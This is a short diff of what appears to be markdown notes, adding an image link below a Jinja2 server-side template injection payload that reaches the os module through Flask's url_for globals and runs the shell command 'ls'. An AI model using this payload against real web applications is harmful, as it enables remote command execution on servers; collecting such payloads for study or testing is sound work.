@@ -16,3 +16,6 @@
  #not sure if it works but i found this.
  {{ url_for.__globals__.os.popen("ls").read() }}
  ```
+
+![image](https://github.com/user-attachments/assets/d812c5f3-2f59-476a-a1e8-6a7ae978695a)
+
